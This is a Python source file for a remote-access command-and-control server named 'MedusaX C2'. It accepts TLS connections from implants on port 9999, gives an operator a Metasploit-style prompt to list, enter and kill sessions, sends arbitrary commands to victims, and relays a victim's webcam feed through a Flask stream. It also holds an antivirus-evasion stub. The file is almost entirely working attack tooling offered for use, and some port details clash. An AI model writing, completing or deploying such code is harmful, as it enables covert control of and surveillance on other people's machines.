import socket
import threading
import ssl
import os
import signal
from flask import Flask, Response
import base64

# Flask for webcam streaming
app = Flask(__name__)
streaming_client_id = None
stream_data = b''
server_running = True

clients = {}
sessions = {}
session_id_counter = 0

CERT_FILE = 'cert.pem'
KEY_FILE = 'key.pem'

def evade_av():
    pass  # Placeholder for legal AV evasion methods

def handle_client(client_socket, addr):
    global session_id_counter
    session_id = session_id_counter
    session_id_counter += 1
    sessions[session_id] = client_socket
    print(f"[+] New TLS connection from {addr}, Session ID: {session_id}")
    while True:
        try:
            data = client_socket.recv(4096).decode()
            if not data:
                break
            print(f"[Session {session_id}] {data}")
        except:
            break
    client_socket.close()
    del sessions[session_id]
    print(f"[-] Connection from {addr} closed")

def accept_connections(server_socket):
    while True:
        client_socket, addr = server_socket.accept()
        ssl_client = context.wrap_socket(client_socket, server_side=True)
        threading.Thread(target=handle_client, args=(ssl_client, addr)).start()

@app.route('/stream')
def stream():
    def generate():
        global stream_data
        while server_running:
            if stream_data:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + stream_data + b'\r\n')
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

def start_flask():
    app.run(host='127.0.0.1', port=80, threaded=True)

def medusax_prompt():
    global streaming_client_id, server_running
    print("Welcome to MedusaX C2")
    while True:
        try:
            cmd = input("admin@medusax~$ ")
            if cmd == 'sessions':
                for sid in sessions:
                    print(f"Session {sid}: {sessions[sid].getpeername()}")
            elif cmd.startswith('sessions -i'):
                sid = int(cmd.split()[2])
                interact_session(sid)
            elif cmd.startswith('sessions -k'):
                sid = int(cmd.split()[2])
                sessions[sid].close()
                del sessions[sid]
                print(f"Session {sid} killed")
            elif cmd == 'sessions -K':
                for sid in list(sessions):
                    sessions[sid].close()
                    del sessions[sid]
                print("All sessions killed")
            elif cmd == 'background':
                return
        except KeyboardInterrupt:
            print("Returning to main shell.")
        except Exception as e:
            print(f"Error: {e}")

def interact_session(sid):
    global streaming_client_id, server_running
    client = sessions.get(sid)
    if not client:
        print("Invalid session ID")
        return
    while True:
        try:
            command = input(f"Session {sid} > ")
            if command == 'background':
                return
            elif command.startswith("webcam_stream"):
                streaming_client_id = sid
                client.send(command.encode())
                flask_thread = threading.Thread(target=start_flask)
                flask_thread.start()
                print("Streaming on http://localhost:8080/stream")
                try:
                    signal.pause()
                except KeyboardInterrupt:
                    client.send(b"stop_stream")
                    server_running = False
                    os._exit(0)
            else:
                client.send(command.encode())
        except KeyboardInterrupt:
            print("Returning to MedusaX prompt")
            return

if __name__ == '__main__':
    evade_av()

    # TLS Context
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

    # Plain socket, wrapped with TLS
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[+] Starting TCP handler on port 9999")
    
    threading.Thread(target=accept_connections, args=(server,)).start()
    medusax_prompt()
